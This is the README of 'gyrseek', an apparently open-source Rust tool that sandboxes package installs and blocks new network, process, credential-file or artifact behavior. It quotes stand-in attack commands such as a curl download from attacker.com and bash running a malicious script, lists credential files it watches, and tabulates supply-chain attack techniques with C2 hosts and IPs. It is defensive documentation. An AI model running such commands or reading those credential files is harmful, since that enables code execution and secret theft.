# gyrseek

`gyrseek` is a Rust CLI wrapper that sits in front of your package manager. Before it lets an install or update run, it installs the target version (and a couple of older "baseline" versions) inside a sandbox, traces their behavior with `strace`, and **blocks the command if the new version does something the older ones never did** — like contacting a new network endpoint or running a hidden `git clone`.

Think of it as a behavioral diff between "the version you're about to install" and "versions that were already trusted."

```bash
# Instead of:        npm install lodash
# You run:           ./target/release/gyrseek npm install lodash
```

If nothing suspicious is found, your original command is forwarded and runs normally. If something new shows up, `gyrseek` aborts and tells you why.

## Table of Contents

- [Introduction](#introduction)
- [Quick Start](#quick-start)
- [Just Recipes](#just-recipes)
- [Supported Commands](#supported-commands)
- [Usage](#usage)
- [How It Works](#how-it-works)
  - [Network Behavior Detection](#network-behavior-detection)
  - [Git Clone Behavior Detection](#git-clone-behavior-detection)
  - [Process-Execution Behavior Detection](#process-execution-behavior-detection)
  - [Sensitive File Access Behavior Detection](#sensitive-file-access-behavior-detection)
  - [Post-Install Artifact Behavior Detection](#post-install-artifact-behavior-detection)
- [Package Related Supply Chain Attack Detection Coverage](#package-related-supply-chain-attack-detection-coverage)
- [Configuration](#configuration)
- [Sandbox Modes](#sandbox-modes)
- [Prebuilt Scanner Images](#prebuilt-scanner-images)
- [Behavior Reference](#behavior-reference)
- [Docker Security](#docker-security)
- [Testing](#testing)
- [Project Layout & Docs](#project-layout--docs)
- [License](#license)

## Introduction

This tool was created by [Brandon Chuah](https://www.linkedin.com/in/brandonccl/) and [David Craggs](https://www.linkedin.com/in/david-craggs-37851793/), who were working in internal product security roles when we began building this open source CLI.

Our goal is not to compete with existing vendors. Instead, we want to give open source maintainers and small businesses, especially those that might not be able to afford expensive commercial software supply chain tooling, a practical way to address the kinds of supply chain issues highlighted by incidents such as Shai-Hulud.

The tool works out of the box and requires no proxy configuration, as long as Docker is installed. It can be run in host mode, but please note that host mode is only intended for isolated sandbox environments where secrets and environment variables are not present, making it better suited for testing and validation.

We welcome feedback and suggestions to this repository.

## Quick Start

### 1. Prerequisites

- Rust toolchain (`cargo`, `rustc`)
- Network access to package registries (PyPI, npm)
- The package managers you want to wrap (`uv`, `pip`, `poetry`, `npm`, `pnpm`)
- **Docker CLI** on your `PATH` (the default, safer sandbox mode)
- `strace` on your `PATH` only if you use the reduced-safety `host` mode

### 2. Build

```bash
just build
# binary is produced at: target/release/gyrseek
```

### 3. Run your first scan

```bash
# Scan + (if clean) install lodash via npm:
./target/release/gyrseek npm install lodash
```

That's it. `gyrseek` resolves the version, runs the sandbox behavioral diff, and either forwards your command or blocks it with an explanation.

## Just Recipes

The `Justfile` contains convenience recipes for common tasks. All recipes run from the repo root regardless of where you call them from.

| Recipe | What it does |
|---|---|
| `just build` | Builds the release binary (`target/release/gyrseek`). |
| `just install` | Installs `gyrseek` into Cargo's bin directory with `cargo install --path . --locked`. |
| `just uninstall` | Uninstalls `gyrseek` with `cargo uninstall gyrseek`. |
| `just tag` | Tags the current `HEAD` with the version string from `Cargo.toml` (e.g. `v1.2.3`), force-deletes any existing local/remote tag with the same name, and pushes the new tag to `origin`. |
| `just fmt` | Formats the Rust code. |
| `just test` | Runs `cargo test --all-features --locked`. |
| `just lint` | Runs `cargo check`, clippy for all targets/features, and a format check. Use this before committing. |
| `just test-npm` | End-to-end test: scans and installs `lodash`, then runs `npm update` and `npm i` against the test fixture in `tests/npm/`. Builds the release binary first. |
| `just test-pnpm` | End-to-end test: scans and adds `lodash`, then runs `pnpm update` and `pnpm i` against the test fixture in `tests/pnpm/`. Builds the release binary first. |
| `just test-pip` | End-to-end test: creates a venv, then scans and installs `black`, the packages from `tests/pip/requirements.txt`, and runs `pip3 install --upgrade pip` via `pip3`. Builds the release binary first. |
| `just test-poetry` | End-to-end test: scans `poetry add black`, `poetry install --no-root`, `poetry update`, and `poetry lock` from the `tests/poetry/` fixture. Builds the release binary first. |
| `just test-uv` | End-to-end test: scans `uv add black`, `uv pip install`, `uv sync`, and `uv lock` from the `tests/uv/` fixture. Builds the release binary first. |
| `just docker-build-python` | Builds the Python scanner image from `docker/Dockerfile.python` as `gyrseek-python-scanner:latest`. |
| `just docker-build-npm` | Builds the npm/pnpm scanner image from `docker/Dockerfile.npm` as `gyrseek-npm-scanner:latest`. |

**Typical workflow:**

```bash
# Build once
just build

# Install into Cargo's bin directory
just install

# Uninstall from Cargo's bin directory
just uninstall

# Tag HEAD with the Cargo.toml version and push to origin
just tag

# Run tests
just test

# Check everything is healthy before pushing
just lint

# Run a live end-to-end test for the manager you changed
just test-npm
just test-pnpm
just test-pip
just test-uv
just test-poetry
```

> The end-to-end recipes use `GYRSEEK_SANDBOX=docker` by default (inherited from your environment). Make sure Docker is running before executing them.

## Supported Commands

| Ecosystem  | Commands                                                                                                                              |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| **uv**     | `uv add`, `uv pip install`, `uv pip sync <SRC_FILE>...`, `uv sync`, `uv lock`, `uv lock --upgrade`, `uv lock -P\|--upgrade-package`  |
| **pip**    | `pip install`, `pip3 install` (including `-r/--requirements` files)                                                                   |
| **poetry** | `poetry add`, `poetry update`, `poetry install`, `poetry lock`                                                                        |
| **npm**    | `npm install`, `npm i`, `npm update`                                                                                                  |
| **pnpm**   | `pnpm add`, `pnpm install`, `pnpm i`, `pnpm update`                                                                                   |

> Standalone `git clone` runtime interception is not enabled yet — only install-time clone behavior _inside_ package scans is enforced today (see [Git Clone Behavior](#git-clone-behavior)).

> **`--version` / `-V`:** pass either flag as the first argument to print `gyrseek <version>` and exit 0. This works with no config file or Docker present. A forwarded command's own trailing `--version` (e.g. `gyrseek pip install foo --version`) is passed through unchanged.

## Usage

General pattern:

```bash
cargo run npm install lodash
# or, with the release binary:
./target/release/gyrseek npm install lodash
```

### Python examples

```bash
./target/release/gyrseek uv add pytest
./target/release/gyrseek uv pip install requests==2.31.0
./target/release/gyrseek uv pip sync requirements.txt
./target/release/gyrseek uv pip sync pylock.toml
./target/release/gyrseek uv sync
./target/release/gyrseek uv lock --upgrade
./target/release/gyrseek uv lock -P pytest -P requests
./target/release/gyrseek pip install flask
./target/release/gyrseek pip3 install django==5.0.6
./target/release/gyrseek pip3 install -r requirements.txt
./target/release/gyrseek poetry install
./target/release/gyrseek poetry update pytest
```

### npm examples

```bash
./target/release/gyrseek npm install lodash
./target/release/gyrseek npm install lodash express
./target/release/gyrseek npm i lodash@4.17.21
./target/release/gyrseek npm install
./target/release/gyrseek npm update
./target/release/gyrseek npm update lodash typescript
```

### pnpm examples

```bash
./target/release/gyrseek pnpm add lodash
./target/release/gyrseek pnpm add lodash express
./target/release/gyrseek pnpm add lodash@4.17.21
./target/release/gyrseek pnpm install
./target/release/gyrseek pnpm update
./target/release/gyrseek pnpm update lodash typescript
```

> For project-aware tools like `poetry` or `npm`, run inside a directory containing the expected project files (`pyproject.toml`, `package.json`, etc.).

## How It Works

1. **Parse** the package name and optional version from your command. If no version is given, it's treated as `latest`.
2. **Fetch version history** from PyPI (Python) or the npm registry (npm/pnpm) and order it semantically (semver for npm-family packages, PEP 440 for Python).
3. **Run sandbox installs** for:
   - the current/target version
   - the previous version (`baseline-1`)
   - two versions back (`baseline-2`)

   Multiple packages and versions may run in one sandbox session while keeping per-package, per-version trace attribution. Bulk commands (`uv sync`, `uv pip sync`, etc.) apply this to every detected package.

4. **Compare behavior signals** between the target and its baselines:
   - **Network**: endpoints contacted during install (see [Network Behavior Detection](#network-behavior-detection)).
   - **Git clone**: install-time `git clone` command signatures (see [Git Clone Behavior Detection](#git-clone-behavior-detection)).
   - **Process execution**: all programs executed during install — the payload's own commands plus the sandbox's internal setup (see [Process-Execution Detection](#process-execution-detection)).
   - **Sensitive files**: attempts to read sensitive credentials or configuration files (see [Sensitive File Access Behavior Detection](#sensitive-file-access-behavior-detection)).
   - **Artifacts**: post-install file inventory of every installed file — binary executables, suspicious `.pth` files, unexpected runtimes, and large files (see [Post-Install Artifact Detection](#post-install-artifact-detection)).
5. **Decide**:
   - If one or more behavioral anomalies are found (e.g., new endpoint, clone behavior, process execution, sensitive file read, or artifact finding) → **all findings are aggregated, reported together, and the install is blocked (exits non-zero)**. It does not short-circuit on the first failure.
   - Nothing new → **forward your original command**.
6. **Fail closed**: if a package target was expected but couldn't be detected — _or if the sandbox produced no trace at all_ (e.g. `strace` could not attach) — `gyrseek` blocks rather than letting the command through. A blank trace is never treated as a clean, zero-activity install. New artifact findings across versions also fail closed.
7. **Propagate the host exit code**: when the original command is forwarded, `gyrseek` exits with the package manager's own status. A failed install (non-zero) surfaces as non-zero, so agents and CI `$?` checks are not misled into thinking a broken install succeeded.

This gives you a _behavioral_ signal, rather than relying only on package metadata.

> **Transitive Dependencies:** `gyrseek` natively covers transitive dependencies in two ways:
> 1. **Explicit single-package installs** (e.g., `npm install express`): The sandbox runs the complete package manager install process. Because `strace` monitors the entire process tree, any network connections or process executions triggered by a transitive dependency's install scripts are captured in the trace. If a transitive dependency introduces new malicious behavior not present in the top-level package's baseline, the install is blocked.
> 2. **Lockfile and bulk syncs** (e.g., `uv sync`, `poetry install`, `npm install`): `gyrseek` parses the lockfile or manifest directly. It extracts every package in the dependency tree—including all transitive dependencies—and runs isolated sandbox tests for each one against its own historical baselines before proceeding.

> **PEP 508 extras** (e.g. `requests[security]`) are handled correctly: the extras are stripped for registry lookups and version-pin bookkeeping (so the PyPI lookup hits `requests`, not a 404), while the forwarded install command keeps the full `requests[security]==<scanned version>` spec.

### Network Behavior Detection

`gyrseek` uses syscall tracing (`strace`) during sandbox installs to observe outbound network connections.

- It captures connection target IPs — **both IPv4 and IPv6**, normalized to canonical form — from the trace output.
- It computes the difference between **current version** and **baseline versions** using domain-aware FCrDNS diffing.
- Any endpoint whose domain (or IP, when unresolvable) has not been seen in baseline traffic is treated as a behavioral anomaly.
- Install-time `git clone` command signatures (e.g. clone target and recursive-clone usage) are also diffed across versions.
- Install-time execution of all programs is captured and diffed across versions to catch download-and-run payloads — see [Process-Execution Detection](#process-execution-detection).
- Post-install file inventory (binary executables, suspicious `.pth` files, unexpected runtimes, files >10 MB) is recorded and diffed across versions — see [Post-Install Artifact Detection](#post-install-artifact-detection).
- New IPs are **always** treated as anomalies (fail-closed), unless the IP's FCrDNS resolves to a domain already seen in baseline traffic — in which case it is silently discarded as a benign CDN edge rotation.
- Domain-aware IP diff resolves each IP via FCrDNS and compares at the domain level, not the IP level. If a current IP resolves to a domain already seen in baseline traffic (e.g. a rotated Fastly edge IP for `files.pythonhosted.org`), it is silently discarded — no hardcoded domain list needed. This handles benign CDN edge rotations for any infrastructure automatically. Unresolvable IPs fall back to plain IP membership so the diff stays fail-closed for genuinely new or spoofed endpoints.
- The `domain_allowlist` uses **forward-confirmed reverse DNS (FCrDNS)**: a PTR hostname is only trusted if it resolves _forward_ back to the original IP. An attacker who sets their C2 server's PTR record to an allowlisted domain cannot bypass the allowlist, because the allowlisted domain's real A/AAAA record does not point back at the C2 IP.
- **Environment variables:** Because reading an environment variable (e.g. `process.env.AWS_KEY`) does not make a system call, it is invisible to `strace`. However, `gyrseek` does not need to see the read. If a package reads a secret and attempts to exfiltrate it over the network, the **Network Behavior Detection** flags the new connection to the attacker's IP/domain and kills the install. Exfiltration is caught at the network boundary, regardless of how the payload encrypts or hides the secret in transit.

Example — abnormal network behavior detected:

```text
❌ [gyrseek] CRITICAL WARNING: Behavioral anomaly flagged!
Package 'left-pad', version '1.3.0' contacted new endpoints not seen in baseline versions (1.2.0, 1.1.3): ["203.0.113.42 -> suspicious-c2.example"]
Aborting host operation securely.
```

Example — a new hidden install-time `git clone` detected:

```text
❌ [gyrseek] CRITICAL WARNING: Behavioral anomaly flagged!
Package 'left-pad', version '1.3.0' introduced new git clone behavior not seen in baseline versions (1.2.0, 1.1.3): ["https://github.com/unknown/repo.git|non-recursive"]
Aborting host operation securely.
```

### Git Clone Behavior Detection

- **Install-time clones** (e.g. hidden `git clone` calls inside package scripts) are compared across package versions during scanning, and new behavior is fail-closed unless allowlisted.
- Clone-detection logic is exercised via inline unit tests in `src/scanning.rs` (moved from the old `tests/git_clone_behavior_tests.rs`).
- **Runtime interception of direct `git clone ...` shell commands is not enabled yet** in the CLI parser.

Example warning (simulation/test context):

```text
❌ [gyrseek] CRITICAL WARNING: Behavioral anomaly flagged!
git clone simulation contacted new endpoints not seen in baseline clone behavior: ["185.199.108.133"]
Aborting host operation securely.
```

### Process-Execution Behavior Detection

`gyrseek` takes a least-privilege approach to program execution during installation. Any process a package runs that it didn't run in previous versions is treated as suspect.

#### How it works
It captures **every** `execve` system call inside the sandbox, extracts the executable name and its exact arguments to form a signature, and diffs them against baseline versions. If a new or changed process execution appears, it fails closed.

#### Common Attack Patterns Caught
- **Download-and-Execute (Bun/Deno):** Many attacks don't assume a malicious runtime is present — they download one. For example, the Shai-Hulud "Hades/miasma" PyPI wave downloads the Bun JavaScript runtime and runs an obfuscated stealer via `bun run _index.js`.
- **System Utilities & Shell Scripts (`curl`, `wget`, `bash`, `sh`):** If a package uses `curl` or `wget` to download a payload (e.g., `curl http://attacker.com/payload.sh`), or executes a shell script (e.g., `bash ./malicious.sh` or `sh -c "echo payload"`), the exact executable and its arguments are captured as a signature (like `curl|-O|http://attacker.com/payload.sh` or `bash|./malicious.sh`). Any newly introduced utility/script execution, or an existing utility with new/changed arguments, is flagged. *(Note: The network connection made by `curl` or `wget` is independently caught by the Network Behavior Detection).*

#### Reducing Noise
- **Harness Exclusion:** The sandbox's own install commands (e.g., `uv pip install`, `npm install`) and interpreter-discovery subprocesses are automatically filtered out. Only the package's own behavior contributes to the diff.
- **Allowlisting:** Expected new behavior can be explicitly permitted using the `process_exec_allowlist` config key (see [Configuration](#configuration)).

> **Scope Limitation:** This observes processes executed _inside the sandbox during install_ (e.g., npm `preinstall`/`postinstall` hooks or Python `setup.py` execution). Attacks that defer execution to the _next interpreter startup_ (like the PyPI `*-setup.pth` variant) execute outside this window. However, Gyrseek's post-install artifact scan catches the `.pth` file itself before the install finishes (see [Post-Install Artifact Detection](#post-install-artifact-detection)).

### Sensitive File Access Behavior Detection

`gyrseek` traces `open` and `openat` system calls to actively monitor for credential and configuration theft attempts. While checking environmental variables directly is not possible due to `strace` limitations, monitoring sensitive file access provides a robust defense against exfiltration techniques.

#### How it works
If an installation script unexpectedly reads highly sensitive files (e.g., `~/.aws/credentials`, `~/.ssh/id_rsa`, `~/.npmrc`, `~/.env`, `/etc/passwd`), `gyrseek` captures the hex-escaped path via `strace` and unescapes it for analysis. The accessed files are then diffed against baseline versions. If a new package version accesses sensitive files that older versions never touched, the install is immediately blocked.

#### Why Baseline Diffing is Essential Here
It might seem safer to unconditionally block *any* sensitive file access (ignoring baselines entirely), but this is impractical for a scanner that wraps the entire install process:
- **Package Managers**: The `strace` trace captures the behavior of the package manager itself. `npm` and `yarn` **always** read `~/.npmrc` to find registry URLs and auth tokens. `pip` often reads `/etc/passwd` to resolve the user's home directory.
- **Private Git Dependencies**: If a package has a private git dependency (e.g., `"git+ssh://git@github.com/..."`), the package manager will spawn `git clone`, which legitimately reads `~/.ssh/id_rsa` or `~/.git-credentials` to authenticate.
- **Private Registries**: Companies using AWS CodeArtifact for their private package registry may trigger an AWS credential helper under the hood, which legitimately reads `~/.aws/credentials` during the install.
- **Legitimate Build Tools**: Some packages legitimately read `.env` files during `postinstall` to generate client code (e.g., Prisma).

If `gyrseek` blocked sensitive file reads unconditionally, almost every `npm install` would fail simply because `npm` read `~/.npmrc`, and any project with a private git dependency would break. The baseline diff solves this: if a package has always relied on a private git dependency, the baseline version's installation *also* read `~/.ssh/id_rsa`. `gyrseek` sees no *new* sensitive reads, allowing the install to proceed. However, if a normal utility like `lodash` suddenly tries to read `~/.ssh/id_rsa` in a compromised version, the diff catches the brand new read attempt and blocks it instantly.

> **Note on SDKs (e.g., AWS SDK):** Legitimate SDKs (like `boto3` or `@aws-sdk/client-s3`) **do not** read credentials like `~/.aws/credentials` during installation. They only read them at runtime when imported by your application. Therefore, a clean install of the AWS SDK will not trigger an alert. If an installation *does* try to read them, it is almost certainly a malicious script.

### Post-Install Artifact Behavior Detection

`gyrseek` runs a comprehensive file inventory inside the Docker container **after each install probe**, recording every installed file (path, size, file type, first 300 bytes of content). Classification happens on the Rust side, so new IOC patterns are detected without container script changes.

The classifier emits four signal categories:

1. **`binary`** — ELF, Mach-O, or PE executables deposited in the install tree. Catches cryptominers, compiled malware, and arbitrary native binaries.
2. **`suspicious_pth`** — Python `.pth` files containing executable code (`import`, `exec`, `eval`, `urllib`, `subprocess`, `ctypes`, `socket` patterns). These are essentially never used by legitimate namespace-path `.pth` files and are the Hades/Miasma delivery mechanism.
3. **`unexpected_runtime`** — bun/deno runtime binaries (identified by filename and binary type). A subset of `binary` with higher severity. Catches download-and-execute attacks that leave a runtime behind.
4. **`large_file`** — any file >10 MB in the install tree. Catches data exfiltration staging and large payload drops.

**How it works** — after each per-probe install step in the Docker matrix script, a single `find /work -type f` pipeline inventories every installed file, capturing size via `stat`, type via `file -b`, and a 300-byte content prefix via `head -c`. The raw inventory is written to `/out/gyrseek_artifacts_N.log`, embedded in the probe trace, and classified by `classify_inventory_lines` in scanning.rs before entering the diff pipeline.

**Diff-based verdict** — like all of gyrseek's detection signals, artifact findings are compared across versions. A finding present in a baseline version is expected; a finding newly appearing in the current version (absent from all baselines) is **fail-closed**:

```text
❌ [gyrseek] CRITICAL WARNING: Suspicious artifact(s) discovered after install!
Package 'evil-pkg', version '2.0.0' introduced new suspicious file artifact(s) not
seen in baseline versions (1.9.0, 1.8.0): ["suspicious_pth|/work/site-packages/evil.pth|import socket"]
This may indicate a .pth file with executable content or an unexpected runtime binary.
Aborting host operation securely.
```

This closes the Hades/Miasma `.pth` write-to-disk gap — the `.pth` file is written during `pip install` (as ordinary file I/O, invisible to strace's `network,execve` filter) but detected by the post-install artifact scan before the container session ends. The same pipeline catches ELF-based payloads, large data exfiltration, and any future file-level IOC — all without modifying the container script.

## Package Related Supply Chain Attack Detection Coverage

The table below maps known supply chain attack waves across different ecosystems to gyrseek's verdict and — where the attack fires during install — the specific IoCs gyrseek would have captured. Attack waves attributed to the Shai-Hulud campaign are prefixed with **Shai-Hulud:**.

> **Key:** ✅ Caught during install · ❌ Missed (deferred or out of scope) · ⚠️ Partial

| Attack wave | Start | Ecosystem | Technique | gyrseek | IoCs gyrseek captures (✅) / Why missed (❌) |
|---|---|---|---|---|---|
| **Shai-Hulud: Hades / Miasma PyPI wave** | 2026-05-01 | PyPI | T1: `*-setup.pth` auto-executes on next Python startup | ✅ **New** | **Post-install file inventory + Rust classifier** catches the `.pth` file itself — it's written to disk during `pip install` and detected by the in-container `find /work -type f` pipeline (path, size, type, content) before the container exits. The Rust-side `classify_inventory_lines` flags `.pth` files with executable content (import, exec, urllib, subprocess patterns) and diffs them against baselines via fail-closed diff. This closes the original Hades/Miasma write-to-disk gap. No anomalous network or execve during install, but the `.pth` file is a new artifact signal. |
| | | PyPI | T1b: deferred bun download-and-execute via `.pth` | ✅ **New** | The `.pth` file is caught by the artifact scan at T1 before any deferred execution can occur. The bun download and `bun run _index.js` would still fire outside the install window, but the `.pth` file detection blocks the package before the host command is forwarded. |
| **Shai-Hulud: Bioinformatics & MCP wave** | 2026-06-08 | PyPI | T2: `__init__.py` import hook fires on package import | ❌ | Deferred to import — outside the sandbox window. |
| | | PyPI | T3: compiled `.abi3.so` executes payload via `dlopen()` on import | ❌ | Deferred to import — outside the sandbox window. |
| | | PyPI | T4: split loader/payload across two packages, both needed at Python startup | ❌ | Neither package alone triggers during install; deferred like T1. |
| **gpt-pilot GitHub source compromise** | 2026-06-08 | Python (source repo) | T8: injected telemetry `__init__.py` spawns daemon on application import | ❌ | Fires on import, not `pip install`. The registry wheel is clean; the malicious code is in the source tree. |
| **Shai-Hulud: Red Hat Cloud Services npm** | 2026-06-01 | npm | T5: `preinstall` hook runs `node index.js` during `npm install` | ✅ | **Network:** new outbound connection to `github.com/oven-sh/bun/releases` (Bun download). **Bun execve:** `bun\|run\|_index.js`. Both flagged vs. baseline. |
| | | npm | T5b: version-to-version bun execve signature diff | ✅ | gyrseek captures the full bun argv (`bun\|run\|<args>`) via strace and diffs the signature set across package versions. Newly introduced bun execution is flagged; existing bun execution with any new or changed arguments (e.g. `bun run build` → `bun run build` + `bun run _index.js`) is also flagged. This catches obfuscation that adds extra bun calls or changes bun arguments between versions. |
| | | npm | T13: fake `api.anthropic.com` traffic during exfiltration | ✅ | If exfiltration fires during the `npm install` step, the new IP is flagged as a new network connection. |
| | | npm | T21: LLM prompt injection in `_index.js` to defeat static scanners | ✅ (unaffected) | gyrseek uses runtime behavioral diffing, not LLM analysis — prompt injection in the payload has no effect on gyrseek's detection. |
| **Shai-Hulud: @antv ecosystem worm** (639 versions, 323 packages) | 2026-05-19 | npm | T5: `preinstall` hook on each worm-republished package | ✅ | **Network:** new outbound connection to `github.com/oven-sh/bun/releases`. **Bun execve:** `bun\|run\|_index.js`. Each worm-injected package triggers the same signals inside the sandbox. |
| | | npm | T15: worm self-propagation via stolen npm tokens (republishes 639 versions) | ⚠️ | The initial install of any worm-injected package is caught (T5 above). The downstream worm propagation — using stolen tokens to republish further packages — is not blocked by gyrseek. **Release burst signal:** 639 versions published in 60 minutes would trip `release_burst_threshold` if configured. |
| **Shai-Hulud: Intercom npm compromise** | 2026-04-30 | npm | T6: `preinstall` runs `node setup.mjs`, downloads `router_runtime.js` | ✅ | **Network:** new outbound connection to `github.com/oven-sh/bun/releases` for `bun-linux-x64.zip`. **Bun execve:** `bun\|run\|router_runtime.js`. |
| | | npm | T22: git tag force-update — malicious commit pushed under existing version tag | ⚠️ | If the force-pushed tag introduces new behavioral signals (network, bun execve), the diff catches them. A tag update with no install-time behavioral change is not caught. |
| **Axios npm compromise** | 2026-03-31 | npm | T23: `postinstall` hook on malicious dependency `plain-crypto-js` — `node setup.js` downloads a cross-platform RAT (curl/osascript/cscript/python3), beacons to C2 `sfrclak[.]com:8000`, self-deletes artifacts after execution | ✅ | **Network:** new outbound connection to `sfrclak[.]com:8000` vs. clean axios baseline. **Process exec:** new `node\|setup.js` — axios never runs a `setup.js` postinstall normally. **Process exec:** new `curl`, `nohup python3`, `osascript`, `cscript` executions on the appropriate platform. Anti-forensics (self-delete of `setup.js` + `package.json`) is ineffective — strace captured `execve` and network calls to root-owned `/out/` before deletion. Any single signal blocks the install. |
| **TeamPCP / CanisterWorm campaign** | 2026-03-20 | npm | T24: CanisterWorm — compromised npm publisher backdoors 29+ packages via `postinstall` → `node index.js` → embedded Python dropper → `systemd --user` persistence → ICP canister C2 polling | ✅ | **Process exec:** new `node\|index.js` vs. clean SDK baselines (legitimate versions had no postinstall). **Network:** new outbound to ICP canister `tdtqy-oyaaa-aaaae-af2dq-cai.raw[.]icp0.io`. **Release burst:** 58+ malicious versions across 29+ packages in days. Any single signal blocks the host command. |
| | | PyPI | T25: LiteLLM trojanized release — `.pth` file (`litellm_init.pth`) exfiltrates credentials (SSH keys, cloud creds, env vars, crypto wallets) via AES-256 + RSA-4096 to `models[.]litellm.cloud` | ✅ **New** | **Post-install artifact:** `litellm_init.pth` with executable content caught by the artifact classifier (same T1 `*.pth` detection path) before the container exits — blocks the host command. **Network:** if `.pth` fires during install post-processing, new outbound to `models[.]litellm.cloud` is also caught. The `.pth` artifact signal alone is sufficient to block. |
| | | Any | Trivy Docker images, GitHub Actions tag hijack, KICS action, OpenVSX extensions | ❌ | Outside gyrseek's package-install sandbox scope. These are CI/CD pipeline, image-registry, and IDE-extension compromises — not `npm install`/`pip install` attacks. |
| | | PyPI | T26: Telnyx Python SDK compromised — import-time credential harvester via audio steganography (WAV → base64 → XOR), fileless execution via detached child process, AES-256-CBC + RSA-4096 encrypted exfiltration to `83[.]142[.]209[.]203:8080` | ❌ | Fires on `import telnyx`, not during `pip install`. The threat actor deliberately avoided postinstall hooks — the `FetchAudio()` and `setup()` calls are at `_client.py` module scope. gyrseek's sandbox runs `pip install` (file extraction) but does not trigger module imports post-install. Network IoCs: `83[.]142[.]209[.]203:8080`, `ringtone.wav`/`hangup.wav` downloads. Process exec IoCs: `python3\|-`, `openssl\|enc`, `curl`. |
| | | npm | T27: Namastex.ai / CanisterSprawl — `@automagik/genie`, `pgserve`, `@fairwords/*`, `@openwebconcept/*` compromised via `postinstall` → `node dist/env-compat.cjs`, credential theft (npm, GitHub, cloud, SSH, browser wallets), exfiltration to webhook + ICP canister C2 `cjn37-uyaaa-aaaac-qgnva-cai`, self-propagation (npm republish + PyPI `.pth` cross-propagation via TeamPCP/LiteLLM method) | ✅ **New** | **Process exec:** new `node\|dist/env-compat.cjs` vs. clean baselines — legit packages had no postinstall hook. **Network:** new outbound to `telemetry.api-monitor[.]com/v1/telemetry` and ICP canister `cjn37-uyaaa-aaaac-qgnva-cai.raw[.]icp0.io/drop`. **Post-install artifact:** `.pth` files from PyPI cross-propagation logic. Any single signal blocks the install. |
| | | npm | T28: SAP CAP npm compromise — `mbt`, `@cap-js/db-service`, `@cap-js/postgres`, `@cap-js/sqlite` — `preinstall` → `node setup.mjs` downloads Bun from GitHub Releases, executes obfuscated `execution.js` (11.7 MB, javascript-obfuscator), credential theft, CI runner memory scraping via embedded Python, exfiltration to GitHub commit dead-drop + audit.checkmarx.cx, IDE/Claude persistence | ✅ **New** | **Network:** new outbound to `github.com/oven-sh/bun/releases` for Bun download. **Process exec:** `bun\|run\|<tmpdir>/execution.js` — SAP CAP packages had no preinstall hook or bun dependency in clean versions. **Network:** new outbound to `169.254.169.254` (AWS IMDS), `metadata.google.internal` (GCP), `api.github.com/search/commits?q=OhNoWhatsGoingOnWithGitHub` (C2 dead-drop). Each signal independently blocks the install. |
| | | npm | T29: Bitwarden CLI compromised — `@bitwarden/cli` 2026.4.0 via CI/CD pipeline attack, `bw1.js` downloads Bun from GitHub Releases, Runner.Worker memory scraping via embedded Python, credential theft, exfiltration to `audit.checkmarx[.]cx/v1/telemetry` + GitHub commit dead-drop, npm propagation | ✅ **New** | **Network:** new outbound to `github.com/oven-sh/bun/releases`. **Process exec:** `bun\|run\|bw1.js` — Bitwarden CLI had no bun dependency in clean versions. **Network:** new outbound to `audit.checkmarx[.]cx/v1/telemetry`. **Process exec:** CI runner memory scraping via embedded Python (`python3\|-c\|...`). Any single signal blocks the install. |
| | | npm | T31: **Mini Shai-Hulud** TanStack CI/CD pipeline hijack — credential-free entry via `pull_request_target` Pwn Request + cache poison + OIDC memory extraction → 84 malicious versions across 42 `@tanstack/*` packages in 6 min (May 11 2026, valid SLSA L3 attestations) → self-propagation to Mistral AI, UiPath, Guardrails AI, OpenSearch (200+ packages). `optionalDependencies` git dep → `prepare` lifecycle → Bun download + `router_init.js` credential harvester (AWS/GCP/K8s/Vault/npm/GitHub tokens, SSH keys). OpenAI code-signing keys exfiltrated from infected workstation, forced desktop app reissuance. | ✅ **New** | **Process exec:** new `bun\|run\|router_init.js` — TanStack packages had no bun dependency. **Network:** new outbound to `github.com/oven-sh/bun/releases` and cloud metadata endpoints (IMDS `169.254.169.254`, GCP `metadata.google.internal`). **Trust-chain:** packages carried valid SLSA L3 attestations (first documented case) — gyrseek's behavioral diff is independent of provenance metadata so the SLSA bypass does not affect detection. Any single signal blocks the install. |
| | | PyPI | T32: **Mini Shai-Hulud** `mistralai@2.4.6` — cleartext backdoor appended to `__init__.py` at module scope, fires on `import mistralai` not `pip install`. Exfiltration to `filev2[.]getsession[.]org/file/`, C2 `83[.]142[.]209[.]194`. Downstream fallout: OpenAI corporate devices infected, code-signing keys exfiltrated. | ❌ | Fires on import, not `pip install` — same deferred-execution gap as T2/T3/T4/T26. Network IoCs: `filev2.getsession.org`, `83.142.209.194`. Process exec IoCs: `curl`, `python3`. |
| | | npm | T33: **Mini Shai-Hulud** OIDC self-propagation — worm extracts OIDC token from runner `/proc/*/mem`, exchanges for npm publish token, republishes every package the harvested identity controls | ⚠️ | Initial infected TanStack install is caught (T31). OIDC propagation is a post-install CI/CD pipeline action outside the sandbox window. OIDC token extracted from runner process memory, not from install-time execve/network signals. |
| **easy-day-js: Mastra npm compromise** | 2026-06-17 | npm | T30: 144 `@mastra/*` packages hijacked via unrevoed contributor account (`ehindero`), `easy-day-js` dependency injected → `postinstall` → obfuscated loader with TLS cert validation disabled → downloads second-stage from `23.254.164[.]92` → detached background execution → self-deletion → cross-platform info-stealer (160+ crypto wallets, browser history, credentials) → persistence (Windows/macOS/Linux) → C2 at `23.254.164[.]123` → remote module download and execution | ✅ **New** | **Process exec:** new `node\|<obfuscated-loader>` postinstall — clean Mastra packages (shipped via CI trusted publisher with SLSA provenance) had no postinstall hook executing an unknown loader. **Network:** new outbound to `23.254.164[.]92` (second-stage download) and `23.254.164[.]123` (C2), both resolved and diffed against baselines via domain-aware IP diff. **Post-install artifact:** second-stage info-stealer binary dropped to disk caught by artifact classifier (`binary`). **Provenance gap:** malicious versions pushed via personal npm token without SLSA attestations (npm audit signatures / attestation-verifying install would have rejected them); gyrseek's runtime behavioral diff catches the install-time signals regardless. Any single signal blocks the install. |
| **Shai-Hulud: Intercom PHP / Packagist** | 2026-04-30 | PHP | T7: Composer plugin `post-install-cmd` runs shell script, downloads Bun | ❌ | PHP/Packagist is not a supported manager. Outside gyrseek's scope. Network IoC if it were in scope: `zero.masscan.cloud:443`. |
| **Post-compromise — CI/CD** | — | Any | T9: GitHub Actions workflow injection (push-triggered) | ❌ | Fires after the malicious package already ran. Outside gyrseek's install-window scope. |
| | | Any | T10: GitHub Actions workflow injection (deployment API, no `workflow` scope needed) | ❌ | Same — post-compromise CI/CD persistence. |
| **Post-compromise — C2 & exfiltration** | — | Any | T11: steganographic C2 via GitHub commit messages (RSA-PSS signed commands) | ❌ | Post-compromise polling — not install-time. |
